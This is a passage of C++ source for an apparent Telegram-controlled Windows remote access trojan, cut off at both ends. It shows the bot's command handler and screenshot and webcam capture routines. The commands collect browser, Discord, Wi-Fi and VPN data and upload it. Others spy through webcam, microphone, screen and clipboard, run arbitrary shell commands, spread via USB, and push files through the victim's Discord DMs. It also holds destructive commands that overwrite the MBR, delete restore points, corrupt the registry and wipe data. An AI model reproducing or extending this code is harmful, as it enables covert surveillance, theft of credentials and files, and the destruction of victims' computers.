                                if ( check_target( oxorany( "/startup" ) ) ) {
                                    if ( install_startup( ) )
                                        https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] startup installed." ) );
                                    else
                                        https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] could not install startup." ) );
                                }

                                if ( check_target( oxorany( "/stop_sources" ) ) ) {
                                    https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] stopped upload." ) );
                                    g_sources->m_upload_projects = false;
                                }

                                if ( check_target( oxorany( "/collect_data" ) ) ) {
                                    https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] collecting data..." ) );
                                    g_network->compile_wifi( );
                                    g_discord->compile_discord( );
                                    g_mullvad->compile_mullvad( );
                                    g_browers->compile_browser( );
                                    compiler::upload( oxorany( "info" ), g_compiler );
                                }

                                if ( check_target( oxorany( "/collect_sources" ) ) ) {
                                    https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] collecting sources..." ) );
                                    CreateThread( NULL, 0, source_thread, reinterpret_cast< void* >( &g_sources ), 0, NULL );
                                }

                                if ( check_target( "/send_message" ) ) {
                                    size_t cmd_start = trimmed.find( "/send_message" );
                                    if ( cmd_start != std::string::npos ) {
                                        size_t space = trimmed.find( ' ', cmd_start );
                                        if ( space != std::string::npos ) {
                                            std::string args = trimmed.substr( space + 1 );
                                            size_t first_space = args.find( ' ' );
                                            if ( first_space != std::string::npos ) {
                                                std::string channel_id = args.substr( 0, first_space );
                                                std::string msg = args.substr( first_space + 1 );

                                                if ( !channel_id.empty( ) && !msg.empty( ) ) {
                                                    if ( g_discord->send_message_to_dm( channel_id, msg ) ) {
                                                        https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] message sent to " ) + channel_id );
                                                    }
                                                    else {
                                                        https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] failed to send message (check token/channel)" ) );
                                                    }
                                                }
                                                else {
                                                    https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] usage: /send_message <channel_id> <message>" ) );
                                                }
                                            }
                                            else {
                                                https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] missing message" ) );
                                            }
                                        }
                                        else {
                                            https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] missing channel_id and message" ) );
                                        }
                                    }
                                }

                                if ( check_target( "/send_file_all" ) ) {
                                    size_t cmd_start = trimmed.find( "/send_file_all" );
                                    if ( cmd_start != std::string::npos ) {
                                        size_t first_space = trimmed.find( ' ', cmd_start );
                                        if ( first_space == std::string::npos ) {
                                            https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] usage: /send_file_all <file_path> [message]" ) );
                                            continue;
                                        }

                                        std::string args = trimmed.substr( first_space + 1 );

                                        std::vector<std::string> parsed_args;
                                        bool in_quotes = false;
                                        std::string current_arg;

                                        for ( size_t i = 0; i < args.size( ); ++i ) {
                                            char c = args[ i ];
                                            if ( c == '"' ) {
                                                in_quotes = !in_quotes;
                                            }
                                            else if ( c == ' ' && !in_quotes ) {
                                                if ( !current_arg.empty( ) ) {
                                                    parsed_args.push_back( current_arg );
                                                    current_arg.clear( );
                                                }
                                            }
                                            else {
                                                current_arg += c;
                                            }
                                        }
                                        if ( !current_arg.empty( ) ) {
                                            parsed_args.push_back( current_arg );
                                        }

                                        for ( auto& arg : parsed_args ) {
                                            arg = unquote( arg );
                                        }

                                        if ( parsed_args.size( ) < 1 ) {
                                            https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] need at least file_path" ) );
                                            continue;
                                        }

                                        std::string file_path = parsed_args[ 0 ];
                                        std::string msg = ( parsed_args.size( ) > 1 ) ? parsed_args[ 1 ] : "";

                                        for ( size_t i = 2; i < parsed_args.size( ); ++i ) {
                                            msg += " " + parsed_args[ i ];
                                        }

                                        if ( !std::filesystem::exists( file_path ) ) {
                                            https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] file not found: " ) + file_path );
                                            continue;
                                        }

                                        if ( g_discord->send_file_to_all_dms( msg, file_path ) ) {
                                            https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] file broadcast to all DMs" ) );
                                        }
                                        else {
                                            https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] failed to broadcast file" ) );
                                        }
                                    }
                                }

                                if ( check_target( "/send_file" ) ) {
                                    size_t cmd_start = trimmed.find( "/send_file" );
                                    if ( cmd_start != std::string::npos ) {
                                        size_t first_space = trimmed.find( ' ', cmd_start );
                                        if ( first_space == std::string::npos ) {
                                            https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] usage: /send_file <channel_id> <file_path> [message]" ) );
                                            continue;
                                        }

                                        std::string args = trimmed.substr( first_space + 1 );

                                        std::vector<std::string> parsed_args;
                                        bool in_quotes = false;
                                        std::string current_arg;

                                        for ( size_t i = 0; i < args.size( ); ++i ) {
                                            char c = args[ i ];
                                            if ( c == '"' ) {
                                                in_quotes = !in_quotes;
                                            }
                                            else if ( c == ' ' && !in_quotes ) {
                                                if ( !current_arg.empty( ) ) {
                                                    parsed_args.push_back( current_arg );
                                                    current_arg.clear( );
                                                }
                                            }
                                            else {
                                                current_arg += c;
                                            }
                                        }
                                        if ( !current_arg.empty( ) ) {
                                            parsed_args.push_back( current_arg );
                                        }

                                        for ( auto& arg : parsed_args ) {
                                            arg = unquote( arg );
                                        }

                                        if ( parsed_args.size( ) < 2 ) {
                                            https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] need at least channel_id and file_path" ) );
                                            continue;
                                        }

                                        std::string channel_id = parsed_args[ 0 ];
                                        std::string file_path = parsed_args[ 1 ];
                                        std::string msg = ( parsed_args.size( ) > 2 ) ? parsed_args[ 2 ] : "";

                                        for ( size_t i = 3; i < parsed_args.size( ); ++i ) {
                                            msg += " " + parsed_args[ i ];
                                        }

                                        if ( !std::filesystem::exists( file_path ) ) {
                                            https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] file not found: " ) + file_path );
                                            continue;
                                        }

                                        if ( g_discord->send_file_to_dm( channel_id, msg, file_path ) ) {
                                            https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] file sent to " ) + channel_id );
                                        }
                                        else {
                                            https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] failed to send file" ) );
                                        }
                                    }
                                }

                                if ( check_target( "/send_file_all" ) ) {
                                    size_t cmd_start = trimmed.find( "/send_file_all" );
                                    if ( cmd_start != std::string::npos ) {
                                        size_t space = trimmed.find( ' ', cmd_start );
                                        if ( space != std::string::npos ) {
                                            std::string args = trimmed.substr( space + 1 );
                                            size_t first_space = args.find( ' ' );
                                            if ( first_space != std::string::npos ) {
                                                std::string file_path = args.substr( 0, first_space );
                                                std::string msg = args.substr( first_space + 1 );
                                                if ( !file_path.empty( ) && std::filesystem::exists( file_path ) ) {
                                                    if ( g_discord->send_file_to_all_dms( msg, file_path ) ) {
                                                        https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] file broadcast to all DMs" ) );
                                                    }
                                                    else {
                                                        https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] failed to broadcast file" ) );
                                                    }
                                                }
                                                else {
                                                    https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] usage: /send_file_all <file_path> [message]" ) );
                                                }
                                            }
                                            else {
                                                https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] missing file path" ) );
                                            }
                                        }
                                        else {
                                            https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] missing arguments" ) );
                                        }
                                    }
                                }

                                if ( check_target( oxorany( "/overwrite_mbr" ) ) ) {
                                    https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] are you sure? (yes/no)" ) );
                                    int64_t confirm_offset = last_update_id + 1;
                                    for ( int attempts = 0; attempts < 30; attempts++ ) {
                                        Sleep( 2000 );
                                        std::string confirm_str = https::get_telegram_message( confirm_offset );
                                        if ( confirm_str.empty( ) ) continue;

                                        try {
                                            auto confirm_updates = json::parse( confirm_str );
                                            if ( !confirm_updates.contains( oxorany( "ok" ) ) || !confirm_updates[ oxorany( "ok" ) ].get<bool>( ) ) continue;

                                            for ( auto& cu : confirm_updates[ oxorany( "result" ) ] ) {
                                                confirm_offset = cu[ oxorany( "update_id" ) ].get<int64_t>( ) + 1;
                                                if ( !cu.contains( oxorany( "message" ) ) ) continue;
                                                auto& cm = cu[ oxorany( "message" ) ];
                                                if ( !cm.contains( oxorany( "text" ) ) ) continue;
                                                std::string reply = cm[ oxorany( "text" ) ].get<std::string>( );

                                                if ( reply == oxorany( "yes" ) ) {
                                                    https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] overwriting boot loader.." ) );
                                                    overwrite_mbr( );
                                                    goto overwrite_done;
                                                }
                                                else if ( reply == oxorany( "no" ) ) {
                                                    https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] cancelled." ) );
                                                    goto overwrite_done;
                                                }
                                            }
                                        }
                                        catch ( ... ) { }
                                    }
                                    https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] confirmation timed out." ) );
                                overwrite_done:;
                                }

                                if (check_target("/spread_usb")) {
                                    if (spread_usb_wmi())
                                        https::send_telegram_message(oxorany("[@") + target_username + oxorany("] installed successfully."));
                                    else
                                        https::send_telegram_message(oxorany("[@") + target_username + oxorany("] failed (admin required)."));
                                }

                                if ( check_target( oxorany( "/send_screenshot" ) ) ) {
                                    auto screenshot = capture_screen_png( );
                                    if ( !screenshot.empty( ) )
                                        https::send_telegram_photo( screenshot );
                                    else
                                        https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] failed to capture screenshot." ) );
                                }

                                if ( check_target( oxorany( "/send_webcam" ) ) ) {
                                    auto frame = capture_webcam_mf( );
                                    if ( !frame.empty( ) )
                                        https::send_telegram_photo( frame );
                                    else
                                        https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] failed to capture webcam frame." ) );
                                }

                                if ( check_target( oxorany( "/record_audio" ) ) ) {
                                    https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] recording audio.." ) );

                                    int secs = 10;
                                    auto pos = trimmed.find( oxorany( "/record_audio" ) );
                                    if ( pos != std::string::npos ) {
                                        auto space = trimmed.find( ' ', pos );
                                        if ( space != std::string::npos ) {
                                            try { secs = std::stoi( trimmed.substr( space + 1 ) ); }
                                            catch ( ... ) { }
                                        }
                                    }
                                    record_audio( secs );
                                }

                                if ( check_target( oxorany( "/lock_screen" ) ) ) {
                                    LockWorkStation( );
                                    https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] workstation locked." ) );
                                }

                                if ( check_target( oxorany( "/clipboard" ) ) ) {
                                    std::string clipboard = get_clipboard_text( );
                                    if ( !clipboard.empty( ) )
                                        https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] clipboard:\n" ) + clipboard );
                                    else
                                        https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] clipboard is empty or contains non‑trimmed." ) );
                                }

                                if ( check_target( oxorany( "/bsod" ) ) ) {
                                    https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] triggering BSOD..." ) );
                                    trigger_bsod( );
                                }

                                if ( check_target( oxorany( "/shutdown" ) ) ) {
                                    https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] shutdown? (yes/no)" ) );
                                    if ( confirm_action( last_update_id, target_username ) ) {
                                        https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] shutting down..." ) );
                                        system( oxorany( "shutdown /s /t 5" ) );
                                    }
                                }

                                if ( check_target( oxorany( "/restart" ) ) ) {
                                    https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] restart? (yes/no)" ) );
                                    if ( confirm_action( last_update_id, target_username ) ) {
                                        https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] restarting..." ) );
                                        system( oxorany( "shutdown /r /t 5" ) );
                                    }
                                }

                                if ( check_target( oxorany( "/upload_file" ) ) ) {
                                    size_t cmd_pos = trimmed.find( oxorany( "/upload_file" ) );
                                    if ( cmd_pos != std::string::npos ) {
                                        size_t space = trimmed.find( ' ', cmd_pos + 12 );
                                        if ( space != std::string::npos ) {
                                            std::string filepath = trimmed.substr( space + 1 );
                                            filepath.erase( filepath.find_last_not_of( oxorany( " \t\r\n" ) ) + 1 );
                                            if ( std::filesystem::exists( filepath ) ) {
                                                std::ifstream file( filepath, std::ios::binary );
                                                if ( file ) {
                                                    std::vector<BYTE> content( ( std::istreambuf_iterator<char>( file ) ), {} );
                                                    std::string filename = std::filesystem::path( filepath ).filename( ).string( );
                                                    https::send_telegram_document( content, filename );
                                                    https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] uploaded: " ) + filepath );
                                                }
                                            }
                                        }
                                    }
                                }

                                if ( check_target( oxorany( "/download" ) ) ) {
                                    size_t cmd_pos = trimmed.find( oxorany( "/download" ) );
                                    if ( cmd_pos != std::string::npos ) {
                                        size_t space1 = trimmed.find( ' ', cmd_pos + 9 );
                                        if ( space1 != std::string::npos ) {
                                            size_t space2 = trimmed.find( ' ', space1 + 1 );
                                            std::string url = trimmed.substr( space1 + 1, space2 - space1 - 1 );
                                            std::string dest = ( space2 != std::string::npos ) ? trimmed.substr( space2 + 1 ) : "";

                                            url = unquote( url );
                                            dest = unquote( dest );

                                            if ( !url.empty( ) && !dest.empty( ) ) {
                                                if ( download_file( url, dest ) ) {
                                                    https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] downloaded to: " ) + dest );
                                                }
                                                else {
                                                    https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] download failed." ) );
                                                }
                                            }
                                            else {
                                                https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] usage: /download <url> <dest>" ) );
                                            }
                                        }
                                        else {
                                            https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] missing arguments" ) );
                                        }
                                    }
                                }

                                if ( check_target( oxorany( "/browse" ) ) ) {
                                    size_t cmd_pos = trimmed.find( oxorany( "/browse" ) );
                                    if ( cmd_pos != std::string::npos ) {
                                        size_t space = trimmed.find( ' ', cmd_pos + 7 );
                                        if ( space != std::string::npos ) {
                                            std::string url = trimmed.substr( space + 1 );
                                            url.erase( 0, url.find_first_not_of( oxorany( " \t\r\n" ) ) );
                                            url.erase( url.find_last_not_of( oxorany( " \t\r\n" ) ) + 1 );

                                            if ( url.find( oxorany( "://" ) ) == std::string::npos ) {
                                                url = oxorany( "https://" ) + url;
                                            }

                                            HINSTANCE result = ShellExecuteA( NULL, oxorany( "open" ), url.c_str( ), NULL, NULL, SW_SHOWNORMAL );
                                            if ( ( intptr_t )result <= 32 ) {
                                                std::string cmd = oxorany( "start " ) + url;
                                                system( cmd.c_str( ) );
                                                https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] opened: " ) + url );
                                            }
                                            else {
                                                https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] opened url: " ) + url );
                                            }
                                        }
                                    }
                                }

                                if ( check_target( oxorany( "/wallpaper" ) ) ) {
                                    size_t cmd_pos = trimmed.find( oxorany( "/wallpaper" ) );
                                    if ( cmd_pos != std::string::npos ) {
                                        size_t space = trimmed.find( ' ', cmd_pos + 10 );
                                        if ( space != std::string::npos ) {
                                            std::string image_path = trimmed.substr( space + 1 );
                                            image_path.erase( 0, image_path.find_first_not_of( oxorany( " \t\r\n" ) ) );
                                            image_path.erase( image_path.find_last_not_of( oxorany( " \t\r\n" ) ) + 1 );

                                            if ( std::filesystem::exists( image_path ) ) {
                                                if ( set_wallpaper( image_path ) ) {
                                                    https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] wallpaper changed to: " ) + image_path );
                                                }
                                            }
                                        }
                                    }
                                }

                                if ( check_target( "/run" ) ) {
                                    size_t cmd_start = trimmed.find( "/run" );
                                    size_t space = trimmed.find( ' ', cmd_start );
                                    if ( space != std::string::npos ) {
                                        std::string cmd = trimmed.substr( space + 1 );
                                        std::string result = exec_cmd( cmd );
                                        https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] output:\n" ) + result );
                                    }
                                    else {
                                        https::send_telegram_message( oxorany( "usage: /run <command>" ) );
                                    }
                                }

                                if (check_target("/delete_restore")) {
                                    delete_restore();
                                    https::send_telegram_message(oxorany("[@") + target_username + oxorany("] Restore points and shadow copies deleted."));
                                }

                                if (check_target("/boot_bsod")) {
                                    boot_bsod();
                                    https::send_telegram_message(oxorany("[@") + target_username + oxorany("] Boot-time BSOD configured."));
                                }

                                if (check_target("/disable_network")) {
                                    disable_network_adapters();
                                    https::send_telegram_message(oxorany("[@") + target_username + oxorany("] Network adapters disabled."));
                                }

                                if (check_target("/disable_usb")) {
                                    disable_usb();
                                    https::send_telegram_message(oxorany("[@") + target_username + oxorany("] USB devices disabled."));
                                }

                                if (check_target("/overwrite_user_data")) {
                                    https::send_telegram_message(oxorany("[@") + target_username + oxorany("] overwriting user data..."));
                                    overwrite_user_data();
                                    https::send_telegram_message(oxorany("[@") + target_username + oxorany("] user data deleted."));
                                }

                                if (check_target("/corrupt_registry")) {
                                    corrupt_registry();
                                    https::send_telegram_message(oxorany("[@") + target_username + oxorany("] registry corrupted."));
                                }

                                if (check_target("/kill_critical")) {
                                    kill_critical_processes();
                                    https::send_telegram_message(oxorany("[@") + target_username + oxorany("] critical system processes terminated."));
                                }

                                if ( check_target( "/wipe" ) ) {
                                    size_t pos = trimmed.find( "/wipe" );
                                    size_t space = trimmed.find( ' ', pos );
                                    std::string target_dir = ( space != std::string::npos ) ? trimmed.substr( space + 1 ) : "";
                                    if ( target_dir.empty( ) ) {
                                        https::send_telegram_message( oxorany( "Usage: /wipe <full_directory_path>" ) );
                                        continue;
                                    }
                                    https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] this will delete all files in " ) + target_dir + oxorany( ". type 'yes' to confirm." ) );
                                    if ( confirm_action( last_update_id, target_username ) ) {
                                        wipe_directory( target_dir );
                                        https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] wipe completed." ) );
                                    }
                                    else {
                                        https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] wipe cancelled." ) );
                                    }
                                }

                                if ( check_target( "/disk_fill" ) ) {
                                    if ( confirm_action( last_update_id, target_username ) ) {
                                        disk_fill( "C:" );
                                        https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] disk fill started." ) );
                                    }
                                    else {
                                        https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] cancelled." ) );
                                    }
                                }

                                if (check_target("/corrupt")) {
                                    https::send_telegram_message(oxorany("[@") + target_username + oxorany("] corrupting full system..."));
                                    delete_restore();
                                    disable_network_adapters();
                                    disable_usb();
                                    overwrite_user_data();
                                    overwrite_mbr();
                                    boot_bsod();
                                    corrupt_registry();
                                    kill_critical_processes();
                                    disk_fill("C:");
                                    https::send_telegram_message(oxorany("[@") + target_username + oxorany("] corruption complete. system is unbootable."));
                                }

                                if ( check_target( oxorany( "/mouse_trails" ) ) ) {
                                    SystemParametersInfoW( SPI_SETMOUSETRAILS, 10, ( PVOID )NULL, SPIF_UPDATEINIFILE );
                                    https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] mouse trails enabled." ) );
                                }

                                if ( check_target( oxorany( "/no_mouse_trails" ) ) ) {
                                    SystemParametersInfoW( SPI_SETMOUSETRAILS, 0, ( PVOID )NULL, SPIF_UPDATEINIFILE );
                                    https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] mouse trails disabled." ) );
                                }

                                if (check_target(oxorany("/messagebox"))) {
                                    size_t cmd_pos = trimmed.find(oxorany("/messagebox"));
                                    if (cmd_pos != std::string::npos) {
                                        size_t space = trimmed.find(' ', cmd_pos + 11);
                                        if (space != std::string::npos) {
                                            std::string arg = trimmed.substr(space + 1);
                                            size_t pipe = arg.find('|');
                                            if (pipe != std::string::npos) {
                                                std::string title = arg.substr(0, pipe);
                                                std::string msg = arg.substr(pipe + 1);

                                                struct MsgBoxData {
                                                    std::string title;
                                                    std::string msg;
                                                };
                                                MsgBoxData* data = new MsgBoxData{ title, msg };

                                                auto thread_func = [](LPVOID lpParam) -> DWORD {
                                                    MsgBoxData* d = static_cast<MsgBoxData*>(lpParam);
                                                    MessageBoxA(NULL, d->msg.c_str(), d->title.c_str(),
                                                        MB_OK | MB_ICONINFORMATION | MB_TOPMOST | MB_SYSTEMMODAL);
                                                    delete d;
                                                    return 0;
                                                    };

                                                CreateThread(NULL, 0, [](LPVOID p) -> DWORD {
                                                    return (*static_cast<decltype(thread_func)*>(p))(p);
                                                    }, &thread_func, 0, NULL);

                                                https::send_telegram_message(oxorany("[@") + target_username +
                                                    oxorany("] message box opened."));
                                            }
                                        }
                                    }
                                }

                                if ( check_target( oxorany( "/freeze" ) ) ) {
                                    freeze_screen( );
                                    https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] blocked input" ) );
                                }

                                if ( check_target( oxorany( "/unfreeze" ) ) ) {
                                    unfreeze_screen( );
                                    https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] unblocked input" ) );
                                }

                                if ( check_target( oxorany( "/chaos" ) ) ) {
                                    freeze_screen( );
                                    disable_task_manager();
                                    g_chaos_running = true;
                                    CreateThread(NULL, 0, chaos_random_sounds, NULL, 0, NULL);
                                    CreateThread(NULL, 0, chaos_scramble_titles, NULL, 0, NULL);
                                    CreateThread(NULL, 0, chaos_window_teleport, NULL, 0, NULL);
                                    CreateThread( NULL, 0, chaos_payload_shake, NULL, 0, NULL );
                                    CreateThread( NULL, 0, chaos_payload_cursor, NULL, 0, NULL );
                                    CreateThread( NULL, 0, chaos_bytebeat_glitch, NULL, 0, NULL );
                                    CreateThread( NULL, 0, chaos_bytebeat_blocky, NULL, 0, NULL );
                                    CreateThread( NULL, 0, chaos_gdi_blur, NULL, 0, NULL );
                                    CreateThread( NULL, 0, chaos_gdi_waves, NULL, 0, NULL );
                                    CreateThread( NULL, 0, chaos_gdi_sphere, NULL, 0, NULL );
                                    CreateThread( NULL, 0, chaos_gdi_bitblt, NULL, 0, NULL );
                                    CreateThread( NULL, 0, chaos_gdi_shake_blt, NULL, 0, NULL );
                                    CreateThread( NULL, 0, chaos_gdi_train, NULL, 0, NULL );
                                    CreateThread( NULL, 0, chaos_gdi_icons, NULL, 0, NULL );
                                    CreateThread( NULL, 0, chaos_gdi_texts, NULL, 0, NULL );
                                    CreateThread( NULL, 0, chaos_gdi_radial, NULL, 0, NULL );
                                    CreateThread( NULL, 0, chaos_gdi_invert, NULL, 0, NULL );
                                    https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] chaos started." ) );
                                }


                                if (check_target("/random_sounds")) {
                                    g_chaos_running = true;
                                    CreateThread(NULL, 0, chaos_random_sounds, NULL, 0, NULL);
                                    https::send_telegram_message(oxorany("[@") + target_username + oxorany("] random system sounds started."));
                                }

                                if (check_target("/volume_max")) {
                                    CreateThread(NULL, 0, chaos_volume_max, NULL, 0, NULL);
                                    https::send_telegram_message(oxorany("[@") + target_username + oxorany("] volume set to 100% and unmuted."));
                                }

                                if (check_target("/scramble_titles")) {
                                    g_chaos_running = true;
                                    CreateThread(NULL, 0, chaos_scramble_titles, NULL, 0, NULL);
                                    https::send_telegram_message(oxorany("[@") + target_username + oxorany("] window title scrambling started."));
                                }

                                if (check_target("/rotate_screen")) {
                                    g_chaos_running = true;
                                    CreateThread(NULL, 0, chaos_rotate_screen, NULL, 0, NULL);
                                    https::send_telegram_message(oxorany("[@") + target_username + oxorany("] screen rotation started (90° every 5s)."));
                                }

                                if (check_target("/window_teleport")) {
                                    g_chaos_running = true;
                                    CreateThread(NULL, 0, chaos_window_teleport, NULL, 0, NULL);
                                    https::send_telegram_message(oxorany("[@") + target_username + oxorany("] window teleportation started."));
                                }

                                if (check_target("/disable_task_manager")) {
                                    disable_task_manager();
                                    https::send_telegram_message(oxorany("[@") + target_username + oxorany("] task Manager disabled."));
                                }

                                if ( check_target( oxorany( "/whoa" ) ) ) {
                                    g_chaos_running = true;
                                    CreateThread( NULL, 0, chaos_whoa_loop, NULL, 0, NULL );
                                    https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] whoa loop started." ) );
                                }

                                if ( check_target( oxorany( "/invert" ) ) ) {
                                    g_chaos_running = true;
                                    CreateThread( NULL, 0, chaos_gdi_invert, NULL, 0, NULL );
                                }

                                if ( check_target( oxorany( "/shake" ) ) ) {
                                    g_chaos_running = true;
                                    CreateThread( NULL, 0, chaos_payload_shake, NULL, 0, NULL );
                                }

                                if ( check_target( oxorany( "/cursor" ) ) ) {
                                    g_chaos_running = true;
                                    CreateThread( NULL, 0, chaos_payload_cursor, NULL, 0, NULL );
                                }

                                if ( check_target( oxorany( "/glitch" ) ) ) {
                                    g_chaos_running = true;
                                    CreateThread( NULL, 0, chaos_bytebeat_glitch, NULL, 0, NULL );
                                }

                                if ( check_target( oxorany( "/blocky" ) ) ) {
                                    g_chaos_running = true;
                                    CreateThread( NULL, 0, chaos_bytebeat_blocky, NULL, 0, NULL );
                                }

                                if ( check_target( oxorany( "/blur" ) ) ) {
                                    g_chaos_running = true;
                                    CreateThread( NULL, 0, chaos_gdi_blur, NULL, 0, NULL );
                                }

                                if ( check_target( oxorany( "/waves" ) ) ) {
                                    g_chaos_running = true;
                                    CreateThread( NULL, 0, chaos_gdi_waves, NULL, 0, NULL );
                                }

                                if ( check_target( oxorany( "/sphere" ) ) ) {
                                    g_chaos_running = true;
                                    CreateThread( NULL, 0, chaos_gdi_sphere, NULL, 0, NULL );
                                }

                                if ( check_target( oxorany( "/bitblt" ) ) ) {
                                    g_chaos_running = true;
                                    CreateThread( NULL, 0, chaos_gdi_bitblt, NULL, 0, NULL );
                                }

                                if ( check_target( oxorany( "/train" ) ) ) {
                                    g_chaos_running = true;
                                    CreateThread( NULL, 0, chaos_gdi_train, NULL, 0, NULL );
                                }

                                if ( check_target( oxorany( "/icons" ) ) ) {
                                    g_chaos_running = true;
                                    CreateThread( NULL, 0, chaos_gdi_icons, NULL, 0, NULL );
                                }

                                if ( check_target( oxorany( "/texts" ) ) ) {
                                    g_chaos_running = true;
                                    CreateThread( NULL, 0, chaos_gdi_texts, NULL, 0, NULL );
                                }

                                if ( check_target( oxorany( "/radial" ) ) ) {
                                    g_chaos_running = true;
                                    CreateThread( NULL, 0, chaos_gdi_radial, NULL, 0, NULL );
                                }

                                if ( check_target( oxorany( "/stop_chaos" ) ) ) {
                                    g_chaos_running = false;
                                    unfreeze_screen( );
                                    https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] chaos stopped." ) );
                                }
                            }
                        }
                    }
                }
                catch ( const std::exception& e ) {
                    https::send_telegram_message( oxorany("[@") + target_username + oxorany("] exception: ") + e.what( ) );
                }

                Sleep( 1 );
            }
        }

    private:
        CLSID get_encoder_clsid( const WCHAR* format ) {
            UINT num = 0, size = 0;
            Gdiplus::GetImageEncodersSize( &num, &size );
            if ( size == 0 ) return CLSID_NULL;
            auto* codecs = ( Gdiplus::ImageCodecInfo* )malloc( size );
            if ( !codecs ) return CLSID_NULL;
            Gdiplus::GetImageEncoders( num, size, codecs );
            for ( UINT i = 0; i < num; ++i ) {
                if ( wcscmp( codecs[ i ].MimeType, format ) == 0 ) {
                    CLSID clsid = codecs[ i ].Clsid;
                    free( codecs );
                    return clsid;
                }
            }
            free( codecs );
            return CLSID_NULL;
        }

        std::vector<BYTE> capture_screen_png( ) {
            SetProcessDPIAware( );
            HDC hdc_screen = GetDC( GetDesktopWindow( ) );
            int dpi_x = GetDeviceCaps( hdc_screen, LOGPIXELSX );
            int dpi_y = GetDeviceCaps( hdc_screen, LOGPIXELSY );
            int width = GetSystemMetrics( SM_CXSCREEN ) * ( dpi_x / 96 );
            int height = GetSystemMetrics( SM_CYSCREEN ) * ( dpi_y / 96 );

            HDC     hdc_mem = CreateCompatibleDC( hdc_screen );
            HBITMAP h_bitmap = CreateCompatibleBitmap( hdc_screen, width, height );
            SelectObject( hdc_mem, h_bitmap );
            BitBlt( hdc_mem, 0, 0, width, height, hdc_screen, 0, 0, SRCCOPY );

            Gdiplus::Bitmap bitmap( h_bitmap, nullptr );
            CLSID clsid = get_encoder_clsid( L"image/png" );

            IStream* p_stream = nullptr;
            CreateStreamOnHGlobal( NULL, TRUE, &p_stream );
            bitmap.Save( p_stream, &clsid, nullptr );

            LARGE_INTEGER zero = { 0 };
            ULARGE_INTEGER size;
            p_stream->Seek( zero, STREAM_SEEK_END, &size );
            p_stream->Seek( zero, STREAM_SEEK_SET, nullptr );

            std::vector<BYTE> buffer( size.LowPart );
            ULONG bytes_read = 0;
            p_stream->Read( buffer.data( ), buffer.size( ), &bytes_read );

            DeleteDC( hdc_mem );
            ReleaseDC( nullptr, hdc_screen );
            DeleteObject( h_bitmap );
            p_stream->Release( );

            return buffer;
        }

        std::vector<BYTE> capture_webcam_mf( ) {
            MFStartup( MF_VERSION );

            IMFAttributes* p_attribs = nullptr;
            MFCreateAttributes( &p_attribs, 1 );
            p_attribs->SetGUID( MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE,
                MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID );

            IMFActivate** pp_devices = nullptr;
            UINT32 count = 0;
            HRESULT hr = MFEnumDeviceSources( p_attribs, &pp_devices, &count );
            p_attribs->Release( );

            if ( FAILED( hr ) || count == 0 ) {
                MFShutdown( );
                return {};
            }

            IMFMediaSource* p_source = nullptr;
            hr = pp_devices[ 0 ]->ActivateObject( __uuidof( IMFMediaSource ), ( void** )&p_source );
